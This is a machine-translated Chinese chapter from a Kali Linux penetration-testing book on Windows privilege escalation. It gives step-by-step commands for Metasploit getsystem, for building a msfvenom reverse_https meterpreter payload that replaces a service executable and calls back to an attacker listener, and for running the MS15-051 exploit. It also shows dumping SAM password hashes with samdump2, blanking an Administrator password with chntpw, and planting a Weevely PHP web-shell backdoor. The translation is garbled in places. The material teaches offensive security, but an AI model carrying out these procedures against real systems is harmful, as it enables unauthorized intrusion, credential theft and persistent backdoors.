# 第 7 章 Windows 权限升级

**权限提升**是提高机器或网络访问级别的过程。从技术上讲，可以说任何获得系统访问权限的攻击都会提升攻击者的权限。来自对用户访问的无访问权会提升攻击者的权限，但通常该术语用于获取根或系统访问权的攻击。在黑客术语中，**总 Pwnage**。这是攻击者的最终目标。一旦获得此级别的访问权限，系统的所有数据和控制现在都在您的控制之下。窃取数据和/或机密信息现在只是从系统中复制数据的问题。你现在有权利了。在本章中，我们将介绍以下内容：

*   使用 Metasploit 获取访问权限
*   用恶意双胞胎替换可执行文件
*   使用独立工具进行本地权限升级
*   使用物理访问升级权限
*   用杂草编织

# 通过 Metasploit 获得访问权限

Metasploit 为您提供一个“简易按钮”；它叫**getsystem**。一旦利用漏洞攻击系统并运行 MeterMeter 外壳，命令`getsystem`将自动运行利用漏洞攻击，以获得对 Windows 计算机的完全系统级访问。一旦实现了 MeterMeter 外壳，这也适用于几乎所有其他操作系统。Metasploit 将正确利用该操作系统获得完全访问权限。我们在本书的前几章中已经看到了该命令的使用。我们将在这里详细介绍这个命令。

我们将使用 EasyFTP 漏洞获得访问权限。众所周知，某些应用程序必须在管理员帐户下运行才能运行。这也是一个很好的例子，说明了为什么应用程序永远不能在管理员帐户下运行。我们将使用名为`rred`的已知域用户帐户对系统进行攻击。`rred`帐户是一个普通域帐户，具有任何普通域用户都拥有的权限。使用此服务，他可以对 EasyFTP 服务和 FTP 目录进行读/写访问。EasyFTP 服务正在以管理员身份进行**运行。在下面的屏幕截图中，我们可以看到正在使用`rred`帐户运行和利用系统的漏洞：**

![Gaining access with Metasploit](../Images/image00886.jpeg)

利用系统后，我们运行以下命令：

```
sysinfo

```

这表明我们有一个成功的折衷方案，并列出了系统信息。

接下来，运行以下命令：

```
getuid

```

这将显示被利用的帐户正在运行，以及您对该利用的权限。我们可以看到我们有管理员权限。我们需要完全的系统访问权限，因此请运行以下命令：

```
getsystem

```

这提升了您对系统的权限。再次运行`getuid`命令可以看到：

![Gaining access with Metasploit](../Images/image00887.jpeg)

我们现在有一台完全受损的机器。

# 替换可执行文件

Windows 操作系统将许多文件类型视为可执行文件。下表是 Windows/DOS 可执行文件和扩展名的部分列表，如果其中写入了可执行代码，则 Windows 将其视为可执行文件：

<colgroup><col> <col> <col> <col> <col> <col></colgroup> 
| 

扩大

 | 

扩大

 | 

扩大

 | 

扩大

 | 

扩大

 | 

扩大

 |
| --- | --- | --- | --- | --- | --- |
| `a6p` | `dbr` | `ime` | `msi` | `pyzw` | `sxx` |
| `accde` | `dll` | `INF1` | `msp` | `qpx` | `tlcp` |
| `aex` | `dsp` | `INS` | `mst` | `r` | `trs` |
| `agt` | `elf` | `int` | `ndr` | `REG` | `VB` |
| `aif` | `exe` | `INX` | `nt` | `RGS` | `VBE` |
| `air` | `exe1` | `ISU` | `paf.exe` | `rpm` | `vbs` |
| `apk` | `exp` | `jar` | `PDF` | `rtl` | `VBS` |
| `app` | `fmx` | `jax` | `pe` | `run` | `VBSCRIPT` |
| `appref-ms` | `fox` | `JOB` | `pgm` | `rxe` | `wgt` |
| `appx` | `fpx` | `js` | `pif` | `ryb` | `widget` |
| `bas` | `fqy` | `JSE` | `PIF` | `s2a` | `wiz` |
| `bat` | `frm` | `jse` | `pl` | `scr` | `WS` |
| `btm` | `fxp` | `kmd` | `prg` | `SCT` | `wsf` |
| `c` | `gadget` | `le` | `prx` | `self` | `wsh` |
| `cac` | `gambas` | `lnk` | `PS1` | `shb` | `wwe` |
| `cmd` | `gpu` | `mex` | `pwz` | `SHB` | `xap` |
| `com` | `hta` | `mexw32` | `pyd` | `shs` | `xip` |
| `CPL` | `ifs` | `msc` | `pyz` | `sko` | `xlnk` |

我们最习惯于将 EXE 视为一个程序文件，但您可能没有听说过其中的许多。它们大多可以作为攻击向量。毫无疑问，您已经看到（并发出）警告用户存在潜在危险的 EXE、PIF、SCR 和 PDF 文件的通知。对于我们将在这里演示的利用模型，最有可能利用的两种文件类型是 DLL 和 EXE。

如果您可以用巧尽心思构建的 DLL 替换标准 DLL 文件，则可以将恶意软件隐藏在显而易见的地方。当你更新一个程序时，你可能已经看到了依赖性问题，它包括一个特定 DLL 的新的合法版本。新程序运行良好，但一些旧的应用程序失败，出现错误`WBDOOS.DLL not found`。您必须到处搜寻，才能找到一个可以同时使用这两个应用程序的 DLL 副本。CVE-2016-0016 是一个加载特殊 DLL 文件的漏洞。这允许提升特权。它适用于大多数未修补的 Windows 版本。确保已为 MS16-007 修补服务器。

现在，让我们用一个 EXE 来实现这一点。有时，由于文件权限不正确，应用程序可能受到攻击。这可能是由于安装过程中缺乏安全性或安装应用程序的用户配置错误造成的。所有系统管理员都看到了一个错误的应用程序，您必须使用文件权限才能运行该应用程序。这将显示错误的文件权限以及以管理员身份运行服务和应用程序的危险。在演示中，我们中断了 EasyFTP 服务。

### 提示

**圆盘机**：

如上所述，我们已经破坏了 EasyFTP 上的安全。正在使用的设置不是此服务正常安装期间的正常设置。此演示并不反映 EasyFTP 或其开发人员的质量。然而，应该注意的是，这种缺陷可以在许多不同的应用中发现。

以 rred 的身份登录服务器`bo-srv2.boweaver.net`，作为普通用户，我们可以对 EasyFTP 可执行文件运行工具`icacls.exe`，查看该文件的文件权限：

```
icacls ftpbasicsvr.exe

```

在下面，我们看到`Everyone`组对该文件具有完全访问权限。这意味着我们可以使用恶意负载对文件进行写操作。通过在服务或系统重新启动时覆盖此文件，我们的有效负载将运行：

![Replacing the executable](../Images/image00888.jpeg)

首先，我们需要一个有效载荷。有效载荷可以在攻击性安全的漏洞站点[找到 http://www.exploit-db.com](https://www.exploit-db.com/) 。您还可以使用 Metasploit 的 msfvenom 构建自己的负载。

### 提示

**警告**！

小心从互联网下载的有效载荷。仅使用来自已知和可信来源的有效负载和漏洞利用，如攻击性安全的漏洞利用数据库。即使代码来自您信任的源代码，也要始终检查源代码，以确保该漏洞没有造成您不希望发生的情况。

为此，我们将使用 msfvenom 来构建有效负载。您也将在下一章中看到这一点。有效载荷是 pen 测试中的重要工具。记住，坏人就是这样做的。

我们将在下一章使用 msfvenom 进行更深入的讨论。不过，对于本演示，我们仍然需要知道用于构建有效负载的标志：

```
Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val> 
Options: 
 -p, --payload    <payload>       Payload to use. Specify a '-' or stdin to use custom payloads 
 -l, --list       [module_type]   List a module type example: payloads, encoders, nops, all 
 -n, --nopsled    <length>        Prepend a nopsled of [length] size on to the payload 
 -f, --format     <format>        Output format (use --help-formats for a list) 
 -e, --encoder    [encoder]       The encoder to use 
 -a, --arch       <architecture>  The architecture to use 
 --platform   <platform>      The platform of the payload 
 -s, --space      <length>        The maximum size of the resulting payload 
 -b, --bad-chars  <list>          The list of characters to avoid example: '\x00\xff' 
 -i, --iterations <count>         The number of times to encode the payload 
 -c, --add-code   <path>          Specify an additional win32 shellcode file to include 
 -x, --template   <path>          Specify a custom executable file to use as a template 
 -k, --keep                       Preserve the template behaviour and inject the payload as a new thread 
 -o, --options                    List the payload's standard options 
 -h, --help                       Show this message 
 --help-formats               List available formats 

```

我们通过运行以下命令来构建该漏洞：

```
msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_https LHOST=192.168.204.128 LPORT=443  -f exe -o svchost13.exe

```

`-a`标志用于设置架构，即 x86。`–platform`标志将设置操作系统，即 Windows。`-p`标志将设置要使用的有效负载类型。我们还将添加攻击者的机器 IP 地址和要连接的侦听端口。这里，我们使用的是端口 443。我们将使用反向 https 连接来连接到攻击者的机器。`-f`标志是要写入的文件类型。这里是`exe`。最后，`-o`标志指示 venom 写出文件名`ftpbasicsvr.exe`，这是我们要替换的文件名：

![Replacing the executable](../Images/image00889.jpeg)

我们现在有一个恶意负载。你不是总想有恶意的时候吗？这是你的大好机会！

我们需要将文件放在 Kali 攻击机器上，用户可以将其复制到受害者机器上。因此，打开 Nautilus，右键单击并复制：

![Replacing the executable](../Images/image00890.jpeg)

然后点击**文件系统**图标上的，进入`/var/www`目录，右键点击粘贴文件：

![Replacing the executable](../Images/image00891.jpeg)

Kali 上的服务没有设置为自动启动，这是有充分理由的。在敌对环境中，任何打开的侦听端口都可能成为另一个黑客利用的漏洞。我们需要启动 apacheweb 服务。运行以下命令：

```
service apache2 start

```

![Replacing the executable](../Images/image00892.jpeg)

档案准备好了。最好使用 http 或 https 服务来交换文件。这些服务几乎可以在所有系统上使用，因为这些是用于更新系统的协议。网络监控设备可能会检测到或阻止尝试（或成功）连接到 FTP、SSH 或非标准端口等协议。

接下来，我们需要启动负载可以连接的处理程序。从 msfconsole 提示符运行以下命令：

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.204.128
set LPORT 443

```

然后运行以下命令：

```
exploit

```

这将打开端口并开始监听端口`443`以接收受害者机器的呼叫总部：

![Replacing the executable](../Images/image00893.jpeg)

接下来，从受害者机器打开您选择的 web 浏览器，并通过转到`http://192.168.204.128/ftpbasicsvr.exe`从攻击机器获取文件。您的浏览器可能会抱怨下载可执行文件，但只需更改安全设置，然后下载文件即可。这有点嘈杂，具有 ArcSight 客户端的机器将注册您正在作为系统用户进行这些更改：

![Replacing the executable](../Images/image00894.jpeg)

接下来，保存文件：

![Replacing the executable](../Images/image00895.jpeg)

保存到目录。这里我们使用默认目录**下载**：

![Replacing the executable](../Images/image00896.jpeg)

保存文件后，我们需要将其复制到 EasyFTP 工作目录。因此，右键单击该文件并复制：

![Replacing the executable](../Images/image00897.jpeg)

接下来我们将文件粘贴到 EasyFTP 工作目录。它会提示你做什么。点击**复制并替换**。该文件现在已替换为您的有效负载：

![Replacing the executable](../Images/image00898.jpeg)

一旦重新启动服务或系统重新启动，被替换的恶意负载将启动并连接到等待攻击的机器：

![Replacing the executable](../Images/image00899.jpeg)

# 使用独立工具进行本地权限升级

如前所述，利用数据库是获取各种漏洞的独立工具的好地方。使用漏洞数据库最重要的一点是，它是这些工具的可靠来源。利用数据库是由我们的朋友在进攻安全，谁给你带来了卡利 Linux。在这里发现的所有漏洞都经过了审查，可以按预期执行，不会造成任何意外伤害。该数据库也包含在 Kali 中的本地。所有漏洞都可以在`/usr/share/exploitdb`中找到。Kali 还包括一个搜索工具，用于查找本地存储的工具。还有一个内置链接指向 IceWeasel 中的漏洞数据库网站。

要在本地使用 Kali 上的信息查找本地权限升级工具，请运行以下命令：

```
searchsploit "local privilege escalation"

```

我们得到一个列表，如下所示：

![Local privilege escalation with a standalone tool](../Images/image00900.jpeg)

在本演示中，我们将使用一个在过去曾被用作针对民族国家的零日攻击的漏洞。该工具是通过受感染的 PDF 文件攻击系统的软件包的一部分。该文件被 Adobe 漏洞感染，从而允许该代码在计算机上运行并获得权限提升。这利用了 Windows 漏洞 MS15-951，该漏洞允许通过内核模式驱动程序升级本地权限。要使用 searchsploit 查找此文件，请运行以下命令：

```
searchsploit ms15-051

```

![Local privilege escalation with a standalone tool](../Images/image00901.jpeg)

让我们看看这个文件：

```
cat /usr/share/exploitdb/platforms/windows/local/37049.txt

```

![Local privilege escalation with a standalone tool](../Images/image00902.jpeg)

对于此漏洞，有一个预构建的可执行文件可供下载。注意有两种类型；一个用于 32 位，一个用于 64 位。相应地选择并下载该文件。在这里，我们将使用 32 位文件。下载后，将文件移动到`/var/www`并使用以下命令启动 Apache：

```
service apache2 start

```

使用以下命令完成传输时，请确保关闭服务：

```
service apache2 stop

```

使用我们先前泄露的普通用户帐户，我们以 rred 身份登录。然后我们连接到攻击者机器的 web 服务并下载我们的文件：

![Local privilege escalation with a standalone tool](../Images/image00903.jpeg)

下载文件后，打开 PowerShell 窗口。当我们运行命令`whoami`时，我们看到用户是`lab1\rred`：

![Local privilege escalation with a standalone tool](../Images/image00904.jpeg)

移动到下载文件的目录中。在`downloads`目录中。进入目录后，运行以下命令：

```
Taihou32.exe

```

![Local privilege escalation with a standalone tool](../Images/image00905.jpeg)

当漏洞攻击运行时，我们会得到一个命令行窗口，并显示运行提示。通过在此窗口中再次运行`whoami`命令，我们可以看到我们正在以`nt authority`的身份运行，这是最高级别的权限–甚至比管理员帐户更高。从这个窗口，我们可以完全控制系统，随心所欲。

# 通过物理访问提升权限

在写这一章时，薄熙来的一位朋友给了他一份杂务，他需要系统访问他们的笔记本电脑。他们接到了一位社会工程师的电话，他告诉他们他来自微软，而且这位朋友的电脑有问题。这句话的意思是，这位微软工程师不知何故注意到这位朋友的电脑被感染了，而这位“微软工程师”就是来帮忙的。在销毁笔记本电脑上的文件后，他们用密码锁定了系统，并锁定了除攻击期间使用的帐户之外的所有帐户。他们索要 199 美元的密码。即使是一个聪明、知识渊博的人也会被一个好的社会工程骗子抓住。这显示了社会工程的力量，也证明了人是安全中最薄弱的环节。当我们在不同的公司进行安全意识的社会工程测试时，我们仅仅通过询问就获得了人们的密码。

如前所述，系统由一个应用程序锁定，该应用程序在引导时启动，并在系统完全启动之前运行。我们现在无法使用这台机器。由于机器已经被破坏，我们知道，为了完全确保没有进一步的感染，我们需要对操作系统进行核攻击并重新安装。在尝试重新安装操作系统之前，我们需要清除恶意用户帐户。Kali 不仅仅是一个开发工具包。它可以是一个恢复工具包，而且比在线找到的许多更昂贵的恢复工具包更易于使用。它还可以防止您在网上找到的一些被认为是密码恢复工具的工具本身不是特洛伊木马或感染了 rootkit。这将使你的工作比现在更困难。

见见 Bo 的小朋友 Tux。这是一个安装了 Kali Linux 的 USB 驱动器。正如我们将要做的那样，它是恢复密码的有用工具。不过要当心。这只企鹅咬人！

![Escalating privileges with physical access](../Images/image00906.jpeg)

要进入系统，我们将启动 USB 驱动器。这可能是一个头痛的问题，在较新的机器上使用 UEFI 安全引导。UEFI 并没有真正确保任何东西；它只是在引导或安装除 Windows 以外的任何操作系统时遇到了障碍。如何做到这一点取决于笔记本电脑制造商。您需要将其设置为从旧设备引导。设置 BiOS 后，使用系统的引导菜单从 USB 引导。

系统启动后，打开文件管理器，您将看到文件管理器显示两个新驱动器 Windows 和 WinRE。Windows 驱动器将成为笔记本电脑的`C:\`驱动器。WinRE 是恢复驱动器。遗憾的是，您应该能够从这个驱动器进行恢复，但是普通用户没有设置，Windows 也没有自动设置系统恢复。在这种情况下，像往常一样，从中恢复是没有帮助的。通过单击 Windows 驱动器，我们可以看到笔记本电脑驱动器的完整内容，并且系统可以完全访问这些文件。现在，我们可以将用户的文件从此驱动器复制到另一个驱动器以保存用户的数据。因此，只需从 Kali USB 启动，我们就可以完全提升机器的权限来复制文件，正如我们将看到的那样，获取密码哈希并实际更改注册表设置。

## 用 Samdump 抢蜂箱 2

**Samdump2**是一种通过访问注册表配置单元获取密码哈希的工具。由于 Windows 没有运行，这些蜂巢没有被锁定，因此对这些蜂巢的读写与我们的访问级别无关。通过这种方式安装驱动器，注册表配置单元位于`/media/root/Windows/Windows/System32/config/`目录中。运行 samdump2 时必须使用完整的目录树。转到目录并尝试直接向文件运行 samdump2 将失败。我们需要使用两个蜂箱：系统蜂箱和 SAM 蜂箱。

在没有选项的情况下运行 samdump2，或者使用`-h`标志，将为您提供我们在下面看到的选项。Samdump2 只有三个选项：

*   `-h`运行帮助
*   `-d`运行转储
*   `-o file`将输出写入命名文件：

![Robbing the Hives with samdump2](../Images/image00907.jpeg)

因此，我们需要运行以下命令：

```
samdump2 -d /media/root/usbdisk/Windows/Windows/System32/config/SYSTEM /media/root/usbdisk/Windows/Windows/System32/config/SAM

```

我们得到以下输出。注意，`Root Key`列出的`CsiTool-CreateHive`带有一个调零的 ID 号。这是来自系统的危害，表明整个注册表受到危害。**CsiTool**是通常用于固定系统的工具包；但正如您所见，可以修复的工具也可以用于销毁：

```
Root Key : CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}
Default ControlSet: 001
********* CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}\ControlSet001\Control\Lsa\JD *********
n->classname_len = 16 b = 339ea44
********* CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}\ControlSet001\Control\Lsa\Skew1 *********
n->classname_len = 16 b = 339ea7c
********* CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}\ControlSet001\Control\Lsa\GBG *********
n->classname_len = 16 b = 339ead4
********* CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}\ControlSet001\Control\Lsa\Data *********
n->classname_len = 16 b = 339eb14
Bootkey unsorted: 9d93e73af06c13e1378a679b822938f3
Root Key : CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}

```

在这里，黑客正在更改本地用户帐户的访问权限，并禁用除登录用户以外的所有用户：

```
******************** 1 ********************
keyname = CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}\SAM\Domains\Account\Users\000001F4
disabled = 1

username len=13, off=188
lm_hashoffset = 230, lm_size = 4
nt_hashoffset = 234, nt_size = 14

f50f9419a42269f7cf0ee92704e49671
******************** 2 ********************
keyname = CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}\SAM\Domains\Account\Users\000001F5
disabled = 1

username len=5, off=17c
lm_hashoffset = 200, lm_size = 4
nt_hashoffset = 204, nt_size = 4
******************** 3 ********************
keyname = CsiTool-CreateHive-{00000000-0000-0000-0000-000000000000}\SAM\Domains\Account\Users\000003E9
disabled = 0

username len=7, off=188
lm_hashoffset = 1c4, lm_size = 4
nt_hashoffset = 1c8, nt_size = 14

624107d6d19f48b32135d7757a8c25d4

```

这里我们已经获得了本地账号的散列，可以看到除了用户`onelove`之外，所有的账号都被禁用了。这些散列可以被拉入一个文件中，可以使用 Johnny 之类的工具来破解散列：

```
******************** -1 ********************
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae9ff1043105688506c9762a0fced32f:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
onelove:1001:aad3b435b51404eeaad3b435b51404ee:9c0f3e5fea832931e493f7beb9e391d7:::
root@kali:~# 

```

## 拥有 chntpw 的注册表

**Chntpw**（更改 NT 密码）是一个命令行工具，它不仅可以更改用户设置，包括密码，还可以在任何连接的配置单元中编辑注册表设置。使用此工具，您必须使用到配置单元的完整路径。以下是此工具的帮助副本：

```
root@kali:~# chntpw -h
chntpw: change password of a user in a Windows SAM file,
or invoke registry editor. Should handle both 32 and 64 bit windows and
all version from NT3.x to Win8.1
chntpw [OPTIONS] <samfile> [systemfile] [securityfile] [otherreghive] [...]
 -h          This message
 -u <user>   Username or RID (0x3e9 for example) to interactively edit
 -l          list all users in SAM file and exit
 -i          Interactive Menu system
 -e          Registry editor. Now with full write support!
 -d          Enter buffer debugger instead (hex editor), 
 -v          Be a little more verbose (for debuging)
 -L          For scripts, write names of changed files to /tmp/changed
 -N          No allocation mode. Only same length overwrites possible (very safe mode)
 -E          No expand mode, do not expand hive file (safe mode)

Usernames can be given as name or RID (in hex with 0x first)

See readme file on how to get to the registry files, and what they are.
Source/binary freely distributable under GPL v2 license. See README for details.
NOTE: This program is somewhat hackish! You are on your own!

```

从 Kali USB 启动后，您将在文件管理器中看到连接的 Windows 驱动器。要针对蜂巢运行`chntpw`，必须使用蜂巢的完整路径，就像 Samdump2 一样。在这里，我们将重新启用禁用的帐户并清空密码，因此我们需要访问 SAM、系统和默认配置单元。为了能够编辑完整的注册表，您需要装载所有配置单元。为了满足我们的需要，我们只需要装载三个并编辑管理员帐户。因此，运行以下命令。由于格式限制，此处的命令有五行。您希望在一行上运行所有这些操作：

```
chntpw -u Administrator -i /media/root/usbdisk/Windows/Windows/System32/config/SAM /media/root/usbdisk/Windows/Windows/System32/config/SYSTEM /media/root/usbdisk/Windows/Windows/System32/config/SECURITY /media/root/usbdisk/Windows/Windows/System32/config/DEFAULT

```

您将看到安装共享的应用程序的输出，然后将看到交互式命令屏幕，如下所示：

```
<>========<> chntpw Main Interactive Menu <>========<>

Loaded hives: </media/root/usbdisk/Windows/Windows/System32/config/SAM> </media/root/usbdisk/Windows/Windows/System32/config/SYSTEM> </media/root/usbdisk/Windows/Windows/System32/config/SECURITY> </media/root/usbdisk/Windows/Windows/System32/config/DEFAULT>

 1 - Edit user data and passwords
 2 - List groups
 - - -
 9 - Registry editor, now with full write support!
 q - Quit (you will be asked if there is something to save)

```

在这里，我们输入一个`1`来编辑用户数据和密码：

```
What to do? [1] -> 1

===== chntpw Edit User Info & Passwords ====

| RID -|---------- Username ------------| Admin? |- Lock? --|
| 01f4 | Administrator                  | ADMIN  | dis/lock |
| 01f5 | Guest                          |        | dis/lock |
| 03e9 | onelove                        | ADMIN  |          |

```

在这里，我们进入`Administrator`（`01f4`的 RID。然后，我们可以查看此帐户的设置。我们看到该帐户已被禁用。我们需要改变这一点：

```
Please enter user number (RID) or 0 to exit: [3e9] 01f4
================= USER EDIT ====================

RID     : 0500 [01f4]
Username: Administrator
fullname: 
comment : Built-in account for administering the computer/domain
homedir : 

00000220 = Administrators (which has 2 members)

Account bits: 0x0215 =
[X] Disabled        | [ ] Homedir req.    | [X] Passwd not req. | 
[ ] Temp. duplicate | [X] Normal account  | [ ] NMS account     | 
[ ] Domain trust ac | [ ] Wks trust act.  | [ ] Srv trust act   | 
[X] Pwd don't expir | [ ] Auto lockout    | [ ] (unknown 0x08)  | 
[ ] (unknown 0x10)  | [ ] (unknown 0x20)  | [ ] (unknown 0x40)  | 

Failed login count: 0, while max tries is: 0
Total  login count: 13

- - - - User Edit Menu:
 1 - Clear (blank) user password
 2 - Unlock and enable user account [probably locked now]
 3 - Promote user (make user an administrator)
 4 - Add user to a group
 5 - Remove user from a group
 q - Quit editing user, back to user select

```

接下来，我们进入`2`以解锁账户：

```
Select: [q] > 2
Unlocked!
================= USER EDIT ====================

RID     : 0500 [01f4]
Username: Administrator
fullname: 
comment : Built-in account for administering the computer/domain
homedir : 

00000220 = Administrators (which has 2 members)

Account bits: 0x0214 =
[ ] Disabled        | [ ] Homedir req.    | [X] Passwd not req. | 
[ ] Temp. duplicate | [X] Normal account  | [ ] NMS account     | 
[ ] Domain trust ac | [ ] Wks trust act.  | [ ] Srv trust act   | 
[X] Pwd don't expir | [ ] Auto lockout    | [ ] (unknown 0x08)  | 
[ ] (unknown 0x10)  | [ ] (unknown 0x20)  | [ ] (unknown 0x40)  | 

Failed login count: 0, while max tries is: 0
Total  login count: 13

- - - - User Edit Menu:
 1 - Clear (blank) user password
(2 - Unlock and enable user account) [seems unlocked already]
 3 - Promote user (make user an administrator)
 4 - Add user to a group
 5 - Remove user from a group
 q - Quit editing user, back to user select

```

接下来，我们通过输入`1`来清空密码：

```
Select: [q] > 1
Password cleared!
================= USER EDIT ====================

RID     : 0500 [01f4]
Username: Administrator
fullname: 
comment : Built-in account for administering the computer/domain
homedir : 

00000220 = Administrators (which has 2 members)

```

现在我们看到，`Disabled`字段现在处于未选中状态：

```
Account bits: 0x0214 =
[ ] Disabled        | [ ] Homedir req.    | [X] Passwd not req. | 
[ ] Temp. duplicate | [X] Normal account  | [ ] NMS account     | 
[ ] Domain trust ac | [ ] Wks trust act.  | [ ] Srv trust act   | 
[X] Pwd don't expir | [ ] Auto lockout    | [ ] (unknown 0x08)  | 
[ ] (unknown 0x10)  | [ ] (unknown 0x20)  | [ ] (unknown 0x40)  | 

Failed login count: 0, while max tries is: 0
Total  login count: 13

```

下面我们看到没有找到`NT MD4`或`LANMAN`散列：

```
** No NT MD4 hash found. This user probably has a BLANK password!
** No LANMAN hash found either. Try login with no password!

- - - - User Edit Menu:
 1 – Clear (blank) user password
(2 – Unlock and enable user account) [seems unlocked already]
 3 – Promote user (make user an administrator)
 4 – Add user to a group
 5 – Remove user from a group
 q – Quit editing user, back to user select
Select: [q] > 

```

通过启用管理员帐户，您可以绕过破解工具。但是，正如您所看到的，注册表与 CsiTool 的妥协甚至改变了配置单元的根键，因此现在系统不可信，需要重新格式化并重新安装操作系统。

> *“确保它从轨道上发射核弹的唯一方法。”*

您也可以在忘记系统管理员的帐户密码并且需要重置时使用此工具。我们发现这个工具比我们多年来所依赖的 NTcrack 引导盘要好。

在这种情况下，我们仍然需要在核化系统之前检索用户的文件。使用 Kali，您可以完全控制驱动器，因此可以查找用户的文件。将另一个空 USB 驱动器插入系统，并使用文件管理器将用户的文件从 Windows 驱动器复制到空 USB 驱动器。

# 威威弗利的黄鼠狼

Weevely 在运行 PHP 的 Web 服务器上创建 PHP 后门。它的使用非常简单，并且很容易进入 Web 服务器。您可以通过**应用程序****后期开发****Weevely**获得：

![Weaseling in with Weevely](../Images/image00908.jpeg)

当您第一次从菜单启动 Weevely 时，它会打开一个终端窗口，温和地指责您使用脚本不当：

![Weaseling in with Weevely](../Images/image00909.jpeg)

这实际上是一个比`weevely --help`命令更有用的文档字符串：

![Weaseling in with Weevely](../Images/image00910.jpeg)

现在我们知道我们可以生成一个代理，它可以被放到 Web 服务器上。我们可以运行一个终端到目标，我们可以加载一个现有的会话文件。

## 准备使用 Weevely

**Weevely**是一个 Python 脚本，要使用 Weevely，您必须对 Python 进行一些改进：

```
root@kali:~# apt-get install python-pip libyaml-dev
root@kali:~# pip install prettytable Mako pyaml dateutils –upgrade
root@kali:~# pip install pysocks --upgrade

```

如果您赶时间跳过此步骤，可能会收到以下错误消息：

![Preparing to use Weevely](../Images/image00911.jpeg)

## 创建代理

要创建一个代理，我们只需确定一个无害的名称和密码：

![Creating an agent](../Images/image00912.jpeg)

我们将恶意软件文件保存在 Kali`/root/`目录中它们自己的文件夹中，以便在需要时再次找到它们。此目录的更好名称可能如下所示：

![Creating an agent](../Images/image00913.jpeg)

## 现场测试

Weevely 是跨平台的，无论您在哪里提供 PHP 页面，它都应该可以工作。下面是在 Kali Linux 主机上针对 Web 服务器运行 Weevely 的示例：

![Testing Weevely locally](../Images/image00914.jpeg)

## 在 Windows 服务器上测试 Weevely

如果 Windows 服务器运行的是 PHP，那么在 Windows 服务器上测试 Weevely 也同样简单——例如，如果它是运行 WordPress 或其他基于 PHP 的脚本的 web 服务器。我们用于此测试的服务器是运行 PHP 的 Windows server 2012。如果您只是在 Windows 服务器内部使用 Metasploit，则可以将 Weevely 制作的`metrics01.php`文件放入`webroot`文件夹：

![Testing Weevely on a Windows server](../Images/image00915.jpeg)

一旦你有了文件，你可以用它做很多事情。我们只选择了一些操作，尽管您可能可以执行 50 个命令。首先，请使用以下代码与代理联系：

```
weevely http://192.168.56.103/metrics01.php evilHacker

```

与我们在 Kali Web 服务器上测试时显示的条目成功输出相同：

![Testing Weevely on a Windows server](../Images/image00916.jpeg)

### 在 Weevely 寻求帮助

要了解 Weevely 可以做什么，我们将运行`help`命令，查看您可以在 Windows 服务器上运行什么：

```
weevely> :help 

```

帮助文件的读取方式如下表所示。请注意，每个命令的开头都有一个冒号“：”：

<colgroup><col> <col></colgroup> 
| 

命令

 | 

描述

 |
| --- | --- |
| `:audit_suidsgid` | 查找带有 SUID 或 SGID 标志的文件。 |
| `:audit_phpconf` | 审核 PHP 配置。 |
| `:audit_etcpasswd` | 用不同的技巧获得`/etc/passwd`。 |
| `:audit_filesystem` | 审核系统文件的权限是否错误。 |
| `:shell_php` | 执行 PHP 命令。 |
| `:shell_sh` | 执行 Shell 命令。 |
| `:shell_su` | 使用 su 命令提升特权。 |
| `:system_extensions` | 收集 PHP 和 Web 服务器扩展列表。 |
| `:system_info` | 收集系统信息。 |
| `:backdoor_reversetcp` | 执行一个反向 TCP 外壳。 |
| `:backdoor_tcp` | 在 TCP 端口上生成一个外壳。 |
| `:bruteforce_sql` | 蛮力 SQL 数据库。 |
| `:file_cd` | 更改当前工作目录。 |
| `:file_grep` | 打印多个文件中与图案匹配的行。 |
| `:file_find` | 查找具有给定名称和属性的文件。 |
| `:file_rm` | 删除远程文件。 |
| `:file_cp` | 复制单个文件。 |
| `:file_zip` | 压缩或展开 zip 文件。 |
| `:file_enum` | 检查路径列表的存在性和权限。 |
| `:file_check` | 获取远程文件信息。 |
| `:file_edit` | 在本地编辑器上编辑远程文件。 |
| `:file_upload2web` | 自动将文件上传到一个 web 文件夹，并获取相应的 URL。 |
| `:file_gzip` | 压缩或展开 gzip 文件。 |
| `:file_download` | 将文件下载到远程文件系统。 |
| `:file_touch` | 更改文件时间戳。 |
| `:file_webdownload` | 将 URL 下载到文件系统。 |
| `:file_ls` | 列出目录内容。 |
| `:file_read` | 从远程文件系统读取远程文件。 |
| `:file_mount` | 使用 HTTPfs 挂载远程文件系统。 |
| `:file_bzip2` | 压缩或扩展`bzip2`文件。 |
| `:file_tar` | 压缩或扩展 tar 档案。 |
| `:file_upload` | 上传文件到远程文件系统。 |
| `:sql_console` | 执行 SQL 查询或运行控制台。 |
| `:sql_dump` | 多 dbms mysqldump 替换。 |
| `:net_scan` | TCP 端口扫描。 |
| `:net_curl` | 执行一个类似 curl 的 HTTP 请求。 |
| `:net_proxy` | 代理通过目标的本地 HTTP 流量。 |
| `:net_ifconfig` | 获取网络接口地址。 |
| `:net_phpproxy` | 在目标上安装 PHP 代理。 |

`help`文件的下一部分向您展示了可以用来模拟无限制 shell 的命令。由于某种莫名其妙的原因，本部分的命令和描述颠倒了：

<colgroup><col> <col></colgroup> 
| 

说明，或内部命令

 | 

威弗利命令

 |
| --- | --- |
| `zip, unzip` | `file_zip` |
| `touch` | `file_touch` |
| `gzip, gunzip` | `file_gzip` |
| `curl` | `net_curl` |
| `nmap` | `net_scan` |
| `cd` | `file_cd` |
| **whoami、主机名、pwd、uname** | **系统信息** |
| **rm** | **文件** |
| **类别** | **文件读取** |

### 获取系统信息

一旦您查看了`help`文件，合乎逻辑的下一步就是尽可能多地了解系统。要执行此操作，请运行`system_info`命令。这为您提供了一个关于机器详细信息的小表格：

![Getting the system info](../Images/image00917.jpeg)

### 在 Weevely 中使用文件系统命令

